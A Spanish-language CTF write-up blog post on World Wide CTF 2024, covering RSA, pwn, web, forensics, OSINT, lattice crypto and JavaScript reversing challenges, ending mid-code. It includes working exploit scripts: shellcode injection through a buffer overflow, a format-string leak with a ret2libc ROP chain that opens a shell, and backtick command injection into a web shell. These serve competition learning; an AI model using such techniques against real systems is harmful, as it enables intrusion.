---
title: World Wide CTF 2024 Challenges
time: 2024-12-07 5:00:00
categories: [CTF, WriteUps]
tags: [CTF, WriteUps]
image: /assets/posts/WorldWideCTF2024/1.png
---

Hola a todos!

Esto son algunos write ups del CTF organizado por `World Wide Flags` el cual fue un gran CTF y mi equipo `UciTeam1` disfrutamos.

## Begginers

### Simple_RSA
[Original](https://github.com/halexys/UciTeam1/blob/main/World_Wide_CTF_2024/Begginers/Simpler_RSA.md)

Esto es un cifrado similar a RSA, pero vulnerable, ya que en RSA el cifrado ocurre de la manera siguiente:


`c = m^e (mod n)`


Donde c es el mensaje cifrado, m es el mensaje en texto plano, e es un numero que cumple 1 < e < œÜ(n) y gcd(e, œÜ(n)) = 1. 

Pero en el reto el cifrado es este:


`c = flag^p (mod q)`


Para descifrar tenemos que encontrar el inverso modular de p mod q - 1, digase d, o sea debe cumplirse que: *p\*d = 1 mod (q - 1)* 
y luego *c^d mod q = flag*

Podemos demostrar que esto nos llevar√° a la flag :


`flag^p mod q`          


Elevamos *flag^p* al inverso multiplicativo de p, d, y aplicando propiedades de las potencias *flag^p^d = flag^(p\*d)*


`flag^(p*d) mod q`      


Podemos decir que p*d = 1 mod (q - 1) es equivalente a *p\*d=k\*(q-1)+1*, luego


`flag^(k*(q-1)+1) mod q`    


Nuevamente podemos aplicar propiedad de las potencias   


`flag^(q-1)^k * flag^1 mod q`    


Aqui por el teorema peque√±o de Fermat: *F^(q-1) = 1 mod q*, podemos simplificar


`1^k * flag mod q`            


`flag mod q`                     


Y ya tendremos la flag!

Este es el script de python que realiza las operaciones

``` python
# solve.py
p = 20322136122026329892580404875086132520732558134579258531781672192065024437324055172065343417524169304918928056147680414370351055409439818026607876517460045945556933456319117456860928521423787112252544266864178773974904640732880445449138842965327995838722222110164109025916914430044528254715080648900354468118393295346137198518513075775514617222780524163798065365970392865107270392212968677531885628998155305428785133820145555740608026626724539584106018453003156159305252013173659975815845286802275956807162426425721298560633326719023970391963404981189820163950120529861779878077006530640930032570206978446007206971761
q = 19097560527100693557502945814016176943507375936656621847599300620729196257594977906326233653252987169303598004653720974045696589437233399711658994040877123702369987961301047714594623670674571987772814959679153558360152976652255742578324469478560556855210734037861198243000935281050776548747455717266013266531885744852759548255091579407464355390341944708706006878618904548103612995804547530724085856234186750409404880456083750984829553552127853848824218180459231650990529456828407224866655873224370892839628814748212142246752082561042142636866939231370987974125358875253454199574864895153300338298982667319003886687691
c = 4281681357519343869235268029657832985104802601857889851833662824770073601279722389949102805423012693423900316266993146428480448851806951090530135683459342224839031144425810971344588481297094697047852347659595441639804230546879345999083627138617034295731725402645279785129174304818023129638779656619113578465655082808462489379872294929944719545647280271454196700396004152529288987570497804498041888697213294509916951489315431831556860863264254674452235360890586742441263188663158067860877772336480637257856658858967478284817730555629113613134338975168062044831796369552664256963808360408525644200922627703094455580032

d = pow(p,-1,q-1)                                                   # inverso modular multiplicativo de p mod (q-1) 

flag = pow(c,d,q)                                                   # c^d mod q

flag_ascii = bytes.fromhex(hex(flag)[2:]).decode('utf-8')
print(flag_ascii)
```               

``` 
 python3 solve.py 
wwf{ju57_u53_l1br4r135}
```

`wwf{ju57_u53_l1br4r135}`



### White Rabbit

[Original](https://github.com/halexys/UciTeam1/blob/main/World_Wide_CTF_2024/Begginers/WhiteRabbit.md)

Un reto de pwn en un binario de 64 bits, analizamos las propiedades del ejecutable

``` bash
checksec --file=white_rabbit 
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
Partial RELRO   No canary found   NX disabled   PIE enabled     No RPATH   No RUNPATH   31 Symbols	  No	0		2	white_rabbit
```

+ No canary found: Es vulnerable a buffer overflow

+ NX disabled: El codigo de la pila es ejecutable

Observamos el binario
``` bash
./white_rabbit 

  (\_/)
  ( ‚Ä¢_‚Ä¢)
  / > 0x5609dc927180

follow the white rabbit...
```

Nos filtran una direccion de memoria y podemos introducir datos. Desensamblamos el programa con Radare2 y observamos mejor este comportamiento al desensamblar sym.main y sym.follow respectivamente

``` asm
|           0x000011fc      488d057dff..   lea rax, [sub.dbg.main_1180] ; warmup.c:20 ; 0x1180
|           0x00001203      4889c6         mov rsi, rax
|           0x00001206      488d050d0e..   lea rax, str._______p_n_n   ; 0x201a ; "  / > %p\n\n"
|           0x0000120d      4889c7         mov rdi, rax                ; const char *format
|           0x00001210      b800000000     mov eax, 0  
|           0x00001215      e826feffff     call sym.imp.printf         ; int printf(const char *format)
```

``` asm
            ;-- follow:
            ; CALL XREF from sub.dbg.main_1180 @ 0x122e(x)
/ 23: sub.dbg.follow_1169 ();
| afv: vars(1:sp[0x78..0x78])
|           0x00001169      55             push rbp                    ; warmup.c:8 ; void follow();
|           0x0000116a      4889e5         mov rbp, rsp
|           0x0000116d      4883ec70       sub rsp, 0x70
|           0x00001171      488d4590       lea rax, [buf]              ; warmup.c:10
|           0x00001175      4889c7         mov rdi, rax                ; char *s
|           0x00001178      e8d3feffff     call sym.imp.gets           ; char *gets(char *s)
|           0x0000117d      90             nop                         ; warmup.c:11
|           0x0000117e      c9             leave
\           0x0000117f      c3             ret
```

Podemos ver que la direcci√≥n que se filtra es la de la funci√≥n main, luego en sym.follow se encuentra la entrada de usuario capturada con gets (una funci√≥n vulnerable). 

Podemos darnos cuenta de que se reservan 120 bytes antes de la direccion de retorno de main:

``` asm
    push rbp  -> reserva 8 bytes porque estamos en una arquitectura x86_64 y por lo tanto este registro es de 64 bits
    sub rsp, 0x70   ->  reserva 0x70(112 en decimal) bytes
```
Ya tenemos control de RIP. Ahora tenemos que introducir un shellcode en la pila y encontrar una forma de apuntar a esta direcci√≥n.

``` asm
   lea rax, [buf]   -> rax almacena la direccion base del buffer en la pila
```

Buscamos un gadget del tipo `jmp rax`. En radare podemos hacer esto con `/R jmp rax`

``` asm 
/R jmp rax
  0x000010b1               7415  je 0x10c8
  0x000010b3     488b050e2f0000  mov rax, qword [rip + 0x2f0e]
  0x000010ba             4885c0  test rax, rax
  0x000010bd               7409  je 0x10c8
  0x000010bf               ffe0  jmp rax
``` 

Buscamos su desplazamiento con respecto a la direccion de main. Podemos ver la direccion de main listando las funciones con `afl` 

``` bash
python3
Python 3.12.7 (main, Oct  3 2024, 15:15:22) [GCC 14.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> hex(0x00001180-0x000010bf)
'0xc1'
```

Ya tenemos todo lo necesario

```python
# rabbit.py
from pwn import *
import re

io = process('./white_rabbit')
elf = context.binary = ELF('./white_rabbit')

leak = io.recv()
main = int(re.findall(b'0x[a-f0-9]+',leak)[0].decode(),0)
shellcode = asm(shellcraft.sh())                           
jmp_rax = main - 0xc1

payload = shellcode
payload += cyclic(120-len(shellcode))
payload += p64(jmp_rax)

io.sendline(payload)
io.interactive()
io.close()
```


### Secure Shell

[Original](https://github.com/halexys/UciTeam1/blob/main/World_Wide_CTF_2024/Begginers/SecureShell.md)

Nos daban una pagina web en la cual podiamos escribir comandos, la mayoria los denegaba lo que nos daba a pensar que usaba
una whitelist en lugar de una blacklist de comandos. El comando `ls` y `echo` eran de los comandos permitidos, con `ls`
pod√≠amos ver que en el directorio actual hab√≠a un index.php, y `ls /` ve√≠amos que hab√≠an varios archivos entre ellos un `readflag`.
Comenc√© el RCE usando \` command \` con echo: "echo \`cat index.php\`", el index dentro de los comentarios mencionaba los comandos permitidos,
`echo`,`ls`... Luego con "echo \`file /readflag\`" ve√≠amos que era un binario y con "echo \`/readflag\`" le√≠amos la flag.


### All your base are belong to us

Tenemos el siguiente texto codificado:

MkpIbmdFcWs4MzVjR3BHRXFVVnZtZWJUQWtSTlNNamE1dGZYQTdwR25ac203SnJQV2FyTUdHQnA3Uk1XZDNZVFlTNTJjemVya1BCN0dBY2NBNkN4U1VBS29TalVBOU1tR1EyYUF0UVlHZTFYOXp1TThWS2o1OHdKRFJaVXhzTGRaZUpaTGV6NUFWc2JHdm5CbTdjV28yNTRyWGpzQURYdEhkSmJmWmtGREVEQWZWeEhFeDNYanNNODZMZVo2cnM2NExGbU5QeG1mUXBqQ3BoY3pCczlRa3kySnFZb1JzSnFtUnk0cW02WFgyOU50N1g2Vg==

Usando [cyberchef](https://cyberchef.io/) y su operaci√≥n Magic, con la secuencida de operaciones FromBase64 -> FromBase58 -> FromBase32 -> FromBase85 podemos sacar unos caracteres que parecen chinos

îï∑†Ö¶ñ•£Ê°¢È°≤Ê°®Èë¶Êï§ìÖ•ìâÆÈµüîê¥Èê≥Íå¥Èë¨Èµ¥Èê≥êò¥îï≥ìÄ≥Èë≥îî¥ÊïßÊ†¥È¨≤·ïΩ

En la descripci√≥n del reto se alude a base 2^16 o base 65536, usando este [decodificador](https://www.better-converter.com/Encoders-Decoders/Base65536-Decode) extraemos la flag

`wwf{cyb3rch3f_d0esnt_h4v3_4ll_th3_4nsw3rs_4wg0432f}`

## Pwn

### Buffer Brawl

Nos dan un juego en donde nos enfrentamos al stack y tenemos varias opciones:
```
Ladies and gentlemen...
Are you ready? For the main event of the CTF?
Introducing...
A challenge that packs a punch, tests your mettle, and overflows with excitement!
Let's get ready to buffeeeeeeeer!!!


Choose:
1. Throw a jab
2. Throw a hook
3. Throw an uppercut
4. Slip
5. Call off
```

Revisamos la seguridad del binario con checksec:
``` bash
checksec --file=buffer_brawl 
[*] '/home/kalcast/Descargas/buffer_brawl'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    Stripped:   No
```

No tiene nada relevante, pero s√≠ encontramos una [vulnerabilidad de cadena formateada](https://owasp.org/www-community/attacks/Format_string_attack) en la funcion slip:
``` 
Ladies and gentlemen...
Are you ready? For the main event of the CTF?
Introducing...
A challenge that packs a punch, tests your mettle, and overflows with excitement!
Let's get ready to buffeeeeeeeer!!!


Choose:
1. Throw a jab
2. Throw a hook
3. Throw an uppercut
4. Slip
5. Call off
> 4

Try to slip...
Right or left?
%p
0x7ffca7cad6f0
```

El par√°metro %p en una cadena de formato se utiliza para imprimir una direcci√≥n de memoria en formato hexadecimal, con varias podemos imprimir las direcciones de memoria en la pila.

Con este script filtramos las primeras 12 direcciones de memoria del stack y formateamos un poco la salida:

``` python
#leakstack.py
from pwn import *

elf = context.binary = ELF('./buffer_brawl')

io = process('./buffer_brawl')
io.sendline(b"4")
io.recvuntil(b"Right or left?\n")
io.sendline(b"%p"*14)
stack = io.recvline(keepends=False)
stack = [ 
         int(s,16) for s in stack.replace(b"(nil)",b"0x0").replace(b"0x",b" ").split()
         ]
print(stack)

for i, s in enumerate(stack):
    # i+1 because $ offsets start at 1
    print(f"{i+1}: {p64(s)} {hex(s)}") 
```

```
python3 leakstack.py 
[*] '/home/kalcast/Descargas/buffer_brawl'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    Stripped:   No
[+] Starting local process './buffer_brawl': pid 6996
[140732999497680, 29, 140658260300893, 0, 0, 8080988412483825701, 8080988412483825701, 8080988412483825701, 94602831163429, 94888781943153, 7242369383397573120, 94888781944032, 94888781940551, 36]
1: b'\xd0wq\xf4\xfe\x7f\x00\x00' 0x7ffef47177d0
2: b'\x1d\x00\x00\x00\x00\x00\x00\x00' 0x1d
3: b']\xd4\xa3\x8d\xed\x7f\x00\x00' 0x7fed8da3d45d
4: b'\x00\x00\x00\x00\x00\x00\x00\x00' 0x0
5: b'\x00\x00\x00\x00\x00\x00\x00\x00' 0x0
6: b'%p%p%p%p' 0x7025702570257025
7: b'%p%p%p%p' 0x7025702570257025
8: b'%p%p%p%p' 0x7025702570257025
9: b'%p%p\nV\x00\x00' 0x560a70257025
10: b'q\x11$\x04MV\x00\x00' 0x564d04241171
11: b'\x00\xc2\x93\x1d\x95\x10\x82d' 0x648210951d93c200
12: b'\xe0\x14$\x04MV\x00\x00' 0x564d042414e0
13: b'G\x07$\x04MV\x00\x00' 0x564d04240747
14: b'$\x00\x00\x00\x00\x00\x00\x00' 0x24
[*] Stopped process './buffer_brawl' (pid 6996)
```

Escribimos el stack en 6, 11 es el canario y 13 es la direccion de retorno al men√∫. Podemos comprobar esto en radare2 u otro debbugger:

![f1](https://github.com/user-attachments/assets/21c62cc0-ed0b-4073-8b97-935f0c10b5c0)

![return](https://github.com/user-attachments/assets/ef5625c9-3247-4e99-95db-0c8c4d64da63)

La primera imagen es el estado de la pila justo despu√©s de introducir la cadena, y la segunda es justo antes de ret. Como podemos observar efectivamente la d√©cimo-tercera direcci√≥n filtrada es el retorno.

Para calcular la direccion base del ejecutable solo hay que restarle el desplazamiento de esa direccion a la direccion filtrada. Encontramos el desplazamiento en un an√°lisis est√°tico al elf.

![slipreturn](https://github.com/user-attachments/assets/385fe987-62a0-4462-8ffd-8362b0318bfa)

%<n>$p es un identificador de formato que nos permite imprimir un valor espec√≠fico de la pila, donde n es el desplazamiento a a direcci√≥n actual del puntero de pila, contado a partir de 1.

Entonces, podemos obtener las direcciones que nos interesan con %11$p y %13$p y calcular la direccion base del ejecutable, por ahora el script ir√≠a quedando as√≠:

``` python3
from pwn import *
exe = context.binary = ELF("buffer_brawl")
io = process(exe.path)

def stack_leak(p):
    io.sendline(b"4")
    io.recvuntil(b"Right or left?\n")
    io.sendline(p)
    return io.recvline(keepends=False)

cookie, exe_leak = stack_leak(b"%11$p %13$p").split()
cookie = int(cookie[2:], 16)                              # Canario
exe_leak = int(exe_leak[2:], 16)                          # Direccion filtrada
exe.address = exe_leak - 0x1747                           # desplazamiento de la direccion de retorno a la base
``` 

Aqu√≠ ahora necesitamos hacer un ret2libc, para eso necesitamos la direcci√≥n base de libc, pero primero tenemos que filtrar alguna direcci√≥n de las funciones de libc usadas en el ejecutable (printf, puts, etc...)

Nos auxiliaremos del par√°metro %s, que muestra la memoria de una direcci√≥n dada en el stack (los s√≠mbolos de la Global Offset Table en tiempo de ejecuci√≥n contienen la direcci√≥n real de la funci√≥n en libc). El relleno con ljust se usa para alinear correctamente la memoria y asegurarse de que la direcci√≥n de la GOT est√© en la posici√≥n adecuada:

``` python
# 2.Obtener la direccion base de libc
def leak_got(sym):
    addr = stack_leak(b"%7$s".ljust(8, b"_") + p64(exe.got[sym]))
    addr = u64(addr[:6] + b"\x00\x00")
    return addr

puts_addr = leak_got("puts")
io.info(f"{leak("puts")=:x}")

""""
# Usado para encontrar la version de libc correcta en el remoto
io.info(f"{leak_got("printf")=:x}")
io.info(f"{leak_got("read")=:x}")
io.info(f"{leak_got("exit")=:x}")
""" 

libc.address = puts_addr - libc.sym.puts
```
### Seccion incompleta

Bien, ahora necesitamos un buffer overflow para ganar una shell remota. Si dejamos la vida del stack en el juego a 13 exactamente nos lleva a una funci√≥n stack_smash que acepta una entrada:

``` C
void stack_smash(void)

{
  long in_FS_OFFSET;
  undefined auStack_28 [24];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  puts("\nThe stack got dizzy! Now it\'s your time to win!");
  puts("Enter your move: ");
  __isoc99_scanf(&DAT_0010213d,auStack_28);
  if (local_10 == *(long *)(in_FS_OFFSET + 0x28)) {
    return;
  }
                    // WARNING: Subroutine does not return
  __stack_chk_fail();
}
```

Haremos un ROP, para llamar a system('/bin/sh'), podemos encontrar los gadgets con ROPGadget:

```
ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6| grep "pop rax ; ret"

0x00000000000436a4 : add byte ptr [rax - 0x75], cl ; add byte ptr [rbx - 0x75], bl ; pop rax ; ret
0x00000000000436a7 : add byte ptr [rbx - 0x75], bl ; pop rax ; ret
0x0000000000043047 : pop rax ; ret
0x00000000001027d1 : ror byte ptr [rax - 0x7d], 0xc4 ; pop rax ; ret
0x00000000000cd4f2 : sub al, 0x3b ; sub al, 0x75 ; pop rax ; ret
0x00000000000cd4f5 : sub al, 0x75 ; pop rax ; ret

 ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6| grep "pop rdi ; jmp rax"
0x000000000002d114 : pop rdi ; jmp rax
```

Script final:
``` python3 
from pwn import *
exe = context.binary = ELF("buffer_brawl")
libc = context.binary = ELF("/lib/x86_64-linux-gnu/libc.so.6")
# libc = ELF("./libc6_2.35-0ubuntu3.8_amd64.so")
# io = connect("buffer-brawl.chal.wwctf.com", 1337)
# io = connect("localhost",4444)
io = process(exe.path)

# 1.Obtener la direccion base del binario
def stack_leak(p):
    print(f"INPUT={p}")
    io.sendline(b"4")
    io.recvuntil(b"Right or left?\n")
    io.sendline(p)
    return io.recvline(keepends=False)

cookie, exe_leak = stack_leak(b"%11$p %13$p").split()
cookie = int(cookie[2:], 16)                              # Canario
exe_leak = int(exe_leak[2:], 16)                          # Direccion filtrada
exe.address = exe_leak - 0x1747                           # desplazamiento de la direccion de retorno a la base


# 2.Obtener la direccion base de libc
def leak_got(sym):
    addr = stack_leak(b"%7$s".ljust(8, b"_") + p64(exe.got[sym]))
    addr = u64(addr[:6] + b"\x00\x00")
    return addr

puts_addr = leak_got("puts")
io.info(f"{leak_got("puts")=:x}")
""""
# Usado para encontrar la version de libc correcta en el remoto
io.info(f"{leak_got("printf")=:x}")
io.info(f"{leak_got("read")=:x}")
io.info(f"{leak_got("exit")=:x}")
""" 

libc.address = puts_addr - libc.sym.puts

# 3.Lanzar golpes al stack hasta dejarlo en 13
for i in range(29):
    io.sendlineafter(b"\n> ", b"3")


# 4.ROP
payload = cyclic(24)
payload += p64(cookie)
payload += cyclic(8)
payload += p64(libc.address+0x0000000000043047)  # pop rax; ret
payload += p64(libc.sym.system)                  
payload += p64(libc.address+0x000000000002d114)  # pop rdi; jmp rax

payload += p64(next(libc.search(b"/bin/sh")))    # rdi

""" 
# Otra forma mas sencilla usando el objeto rop
rop = ROP([exe, libc])
rop.raw(rop.ret.address)                             # Alinear el stack
rop.call("system", [next(libc.search(b"/bin/sh"))])

payload = flat(
    cyclic(24),
    p64(cookie),
    cyclic(8),
    rop.chain(),
)
"""


io.sendline(payload)
io.success("PWNED")
io.interactive()
```

``` 
python3 exploit.py
[*] '/home/kalcast/Descargas/buffer_brawl'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    Stripped:   No
[*] '/lib/x86_64-linux-gnu/libc.so.6'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    FORTIFY:    Enabled
[+] Starting local process '/home/kalcast/Descargas/buffer_brawl': pid 17873
[*] leak_got("puts")=7fb48d5c8580
[+] PWNED
[*] Switching to interactive mode

You threw an uppercut! -3 to the stack's life points.

The stack got dizzy! Now it's your time to win!
Enter your move: 
$ whoami
kalcast
$  
```

## Forensic 

### Too Hidden

Tenemos una captura de red y observ√°ndola con wireshark o tshark lo √∫nico relevante son unos paquetes ICMP

![icmp](https://github.com/user-attachments/assets/05aa0422-be80-43d8-9af3-e397f6389422)

Todos tienen la misma extensi√≥n y tipo, lo √∫nico que cambia son los dos bytes de Data y por supuesto los checksums. Los dos bytes de Data forman un patr√≥n representado con tres valores (32, 45 y 46). Estos valores llevados de decimal a ASCII representan los caracteres 'SPACE', '-' y '.'. Esto es c√≥digo [Morse](https://en.wikipedia.org/wiki/Morse_code)

Extraemos cada valor y lo convertimos a ASCII, para eso us√© este (no muy bello) one-liner en bash

``` bash
 tshark -r chall.pcapng -x | grep -E '*f\.*[0-9]{2}' | tr '.' ' '| awk {'print $15'} | while read -r line; do for decimal in $line; do printf \\$(printf '%03o' $decimal); done; done
 .-- .-- ..-.  .... --- .-.. -.-- ..--.- ... .... . . . . - ..--.- -.-- --- ..- ..--.- -.-. .- -. ..--.- ..-. .. -. -.. ..--.- -- . ..--.- ..--.. ..--.. ..--.. ..--.. ..--.. ..--.. ..--.. ..--.. ..--.. ..--..
```

Decodificamos el codigo Morse y obtenemos la flag

![holly](https://github.com/user-attachments/assets/70844a9c-9380-4109-ac43-b9924e237a86)

`WWF{HOLYSHEEEET_YOU_CAN_FIND_ME??????????}`


## OSINT

### Bulletproof

Primero que todo nos dan la imagen que tenemos que investigar y tratar de encontrar en que direcci√≥n se encuentra.

![image1](https://github.com/user-attachments/assets/9fc5b0ad-61ad-47d8-9992-76e04eabf9ef)

Realizar una busqueda inversa de la imagen lleva a una publicaci√≥n de una compa√±√≠a hablando sobre cristales blindados en estaciones de gasolina, aqu√≠ podemos llegar a la conclusi√≥n de que el local que estamos buscando es una de estas, probablemente de la compa√±√≠a Shell ya que el esquema de colores que se ve en el cartel con el n√∫mero ‚Äú4‚Äù (rojo y amarillo) corresponde a esta compa√±√≠a

Al observar de cerca algunos detalles en la foto se pueden ver en el cristal hay unas letras, al aplicar efecto espejo a la imagen para hacerlas legibles se ven una direcci√≥n y un n√∫mero tel√©fonico que no se logran leer con total claridad

![image4](https://github.com/user-attachments/assets/cd2eab17-4fa1-4e3f-93d7-0e51fc2c9c3d)

De aqu√≠ se puede sacar un codigo zip (98405) que pertenece a Central Tacoma lo que reduce el √°rea de b√∫squeda a esta zona

![Image5](https://github.com/user-attachments/assets/2a697ba6-2696-4177-8ffd-0bbc55a813b5)

Usando Google Maps se busca Shell Gas Station en esa zona y al observar los detalles de algunas de ellas podemos ver claramente que la direcci√≥n y el n√∫mero tel√©fonico de una de ellas, corresponden con los antes encontrados en la imagen.

![image3](https://github.com/user-attachments/assets/a0f34d9a-3040-4efe-adb3-b74bb8c0103d)

FLAG: `wwf{3907s12thst_tacoma_wa98405_usa}`


## Crypto

### Just Lattice

El esquema de cifrado de aprendizaje con errores (LWE) es un sistema criptogr√°fico basado en celos√≠a con los siguientes componentes matem√°ticos clave:

[Original](https://yun.ng/c/ctf/2024-wwctf/crypto/just-lattice)

```python
from tqdm import tqdm
import numpy as np

P = [...]
C = [...]


P = np.array(P)
C = np.array(C)
q = 127
n = 3


def enc(P, M, q):
    N = P.shape[0]
    n = len(M)
    r = np.random.randint(0, 2, (n, N))
    Z = np.zeros((n, P.shape[1]), dtype=np.int32)
    Z[:, 0] = 1
    C = np.zeros((n, P.shape[1]), dtype=np.int32)
    for i in range(n):
        C[i] = (np.dot(P.T, r[i]) + (np.floor(q/2) * Z[i] * M[i])) % q
    return C


def dec(C, s, q):
    M = np.zeros(len(C), dtype=np.int32)
    for i in range(len(C)):
        M[i] = round((np.dot(C[i], s) % q) * (2/q)) % 2
    return M


def crack_n1_lwe(P, q, num_samples=200):
    known_messages = np.random.randint(0, 2, num_samples)
    ciphertexts = enc(P, known_messages, q)
    best_success = 0
    best_ts = []
    for potential_ts in tqdm(range(q**n)):
        potential_ts = np.unravel_index(potential_ts, (q,) * n)
        potential_s = np.concat((np.array([1]), np.array(potential_ts)))
        success_count = 0
        decrypted = dec(ciphertexts, potential_s, q)
        success_count = np.sum(known_messages == decrypted)
        if success_count > best_success:
            best_success = success_count
            best_ts = potential_ts
        if success_count == num_samples:
            break
    recovered_s = np.concat((np.array([1]), np.array(best_ts)))
    success_rate = best_success / num_samples
    return recovered_s, success_rate


print(f"{q=}")
recovered_s, success_rate = crack_n1_lwe(P, q)
print(recovered_s, success_rate)
M = dec(C, recovered_s, q)


def unprep(s):
    s = ''.join([str(b) for b in s])
    return ''.join([chr(int(s[i:i+8], 2)) for i in range(0, len(s), 8)])


print(unprep(M))
```
```
wwf{1f_y0u_5qu33z3_17_h4rd_3n0u6h_ju1c3_w1ll_c0m3_0u7}
```


## Reversing

### Ransom Waifu

[deobfuscate](https://obf-io.deobfuscate.io/)
Remueve el c√≥digo muerto

Te dar√°s cuenta que solo una funci√≥n es relevante.
```js
function check(_0x266792) {
    ...
}
```

Al decifrar las base64 te dar√°s cuenta de que todas estas cadenas base64 son en realidad operadores realizados en una pila.

El significado de `xy` ypuede ser obvio o no, pero est√° bien, pasaremos a la siguiente parte.
```js
function check(flag) {
    const arr1 = [3, 0, 4, 0, 5, '0', '3', '0', ...];
    const arr2 = ["CzhQSPrjvxQ7vfEm", "spCiy27WpEuz0bAh", ...];
    const operators = {
        CzhQSPrjvxQ7vfEm: 'function (x, y) {\r\n' +
            '        let a = y[x.pop()], b = y[x.pop()]\r\n' +
            '        return b[a]\r\n' +
            '    }',
    ...
    };
    const arr3 = ["d3dme2Zha2VfZmxhZ30=", "d3dme2Zha2VfZmxhZ30=", "d3dme2Zha2VfZmxhZ30=", 17, 19, "length", ...];
    const arr4 = [];
    for (let i = 0; i < flag.length; i++) {
        arr3[i] = flag[i];
    }
    function func(i) {
        arr3.push(i);
        return arr3.length - 1;
    }
    arr1.forEach(el => {
        if (typeof el === "string") {
            const op = eval('(' + operators[arr2[parseInt(el)]] + ')');
            arr4.push(func(op(arr4, arr3)));
        } else {
            arr4.push(el);
        }
    });
    return arr3[arr4.pop()];
```
¬øCuales son los significados de las matrices?

```js
function func(i) {
    arr3.push(i);
    return arr3.length - 1;
}
arr1.forEach(el => {
    if (typeof el === "string") {
        const op = eval('(' + operators[arr2[parseInt(el)]] + ')');
        arr4.push(func(op(arr4, arr3)));
    } else {
        arr4.push(el);
    }
});
```
Aqu√≠ puede observar que los operadores del paso anterior se utilizan con `arr4` y `arr3` como entrada. Los nuevos datos producidos se agregan a `arr3` y el √≠ndice se env√≠a a `arr4`. Adem√°s, en los operadores, `arr3` se accede a trav√©s de indexadores desde `arr4`. Podemos deducir que `arr4` almacena √≠ndices en valores en `arr3`.

`arr2` Por otro lado, parece almacenar solo todas las claves de los operadores, lo que significa `parseInt(el)` que dar√° como resultado un operador, lo que significa que `arr1` es muy probable que sea una pila de operadores. Sin embargo, si `el` no es una cadena int, parece almacenar valores utilizados, `arr4` lo que significa `arr1` que almacena tantos operadores como `arr3` √≠ndices.

- Todos los datos reales est√°n en `arr3`, llam√©moslo `mem`.
- `arr2` son solo operadores, se pueden llamar `ops`.
- `arr1` es un operador √≠ndices + √≠ndices de memoria, se puede llamar `prog`.
- `arr4` se utiliza puramente como una pila, se puede llamar `stack`.
```js
function check(flag) {
    const prog = [3, 0, 4, 0, 5, '0', '3', ...];
    const ops = ["CzhQSPrjvxQ7vfEm", "spCiy27WpEuz0bAh", ...];
    const operators = {
        CzhQSPrjvxQ7vfEm: 'function (x, y) {\r\n' +
            '        let a = y[x.pop()], b = y[x.pop()]\r\n' +
            '        return b[a]\r\n' +
            '    }',
        ...
    }
    const mem = ["d3dme2Zha2VfZmxhZ30=", "d3dme2Zha2VfZmxhZ30=", "d3dme2Zha2VfZmxhZ30=", 17, 19, ...];
    const stack = [];
    for (let i = 0; i < flag.length; i++) {
        mem[i] = flag[i];
    }
    function store_in_mem(i) {
        mem.push(i);
        return mem.length - 1;
    }
    prog.forEach(el => {
        if (typeof el === "string") {
            const op = eval('(' + operators[ops[parseInt(el)]] + ')');
            stack.push(store_in_mem(op(stack, mem)));
        } else {
            stack.push(el);
        }
    });
    return mem[stack.pop()];
}
```
Ahora necesitamos decodificar realmente lo qu√© `prog` almacena.

Podemos usar ganchos o simplemente hacer que todos los operadores devuelvan cadenas.

Dos de las funciones pueden parecer complicadas, pero si las pruebas, son solo suma y resta.

```js
const operators = {
    CzhQSPrjvxQ7vfEm: 'function (x, y) {\r\n' +
        '        let a = y[x.pop()], b = y[x.pop()]\r\n' +
        '        return `${b}[${a}]`\r\n' +
        '    }',
    spCiy27WpEuz0bAh: 'function (x, y) {\r\n        return `${y[x.pop()]}.charCodeAt(0)`\r\n    }',
    mTvc3QBx6ieTIzEA: 'function (x, y) {\r\n        return `!${y[x.pop()]}`\r\n    }',
    I4TO8mHsfL6Tic7v: 'function (x, y) {\r\n' +
        '        let a = y[x.pop()], b = y[x.pop()]\r\n' +
        '        return `${b} % ${a}`\r\n' +
        '    }',
        ...
};
```
Ahora ejec√∫talo pero con los argumentos incluidos.
```js
console.log(check(["'wwf{flag}'", '[155, 25, 81, 18, 37, 247, 169, 26]', '[239, 17, 117, 197, 235, 182, 242, 83]']))
```
¬°Ahora tenemos el programa real!

***Soluci√≥n***
```js
const operators = {
    CzhQSPrjvxQ7vfEm: function (x, y) {
        let a = y[x.pop()], b = y[x.pop()]
        if (Array.isArray(b)) {
            if (!b[a]) console.log(b, a)
            return b[a]
        }
        if (a === 'length') return `${b}.length`
        return `${b}[${a}]`
    },
    spCiy27WpEuz0bAh: function (x, y) {
        return `${y[x.pop()]}`
    },
    mTvc3QBx6ieTIzEA: function (x, y) { return `!${y[x.pop()]}` },
    I4TO8mHsfL6Tic7v: function (x, y) {
        let a = y[x.pop()], b = y[x.pop()]
        if (typeof a === 'number' && typeof b === 'number') return b % a;
        return `(${b} % ${a})`
    },
    UpIk0FsWtwynGyBU: function (x, y) {
        let a = y[x.pop()], b = y[x.pop()]
        if (typeof a === 'number' && typeof b === 'number') return a * b;
        return `(${a} * ${b})`
    },
    HGP5hbB7yJzI2iuN: function (x, y) {
        let a = y[x.pop()], b = y[x.pop()]
        if (typeof a === 'number' && typeof b === 'number') return 1 / (a / b);
        return `(${b} / ${a})`
    },
    '8ZuAtV6T1A4EaCzU': function (x, y) {
        let a = y[x.pop()], b = y[x.pop()]
        if (typeof a === 'number' && typeof b === 'number') return a + b;
        return `(${a}+${b})`
    },
    GkzKiFsahtTuIhWZ: function (x, y) {
        let b = y[x.pop()], a = y[x.pop()]
        if (typeof a === 'number' && typeof b === 'number') return a - b;
        return `(${a} - ${b})`
    },
    iGXbPUsu9ti82rZ3: function (x, y) { return `(${y[x.pop()]} === ${y[x.pop()]})` },
    Ajsp9ey55YxDO6Dh: function (x, y) { return `(${y[x.pop()]} !== ${y[x.pop()]})` },
    CTI3do19ytT13s0V: function (x, y) { return `(${y[x.pop()]} & ${y[x.pop()]})` },
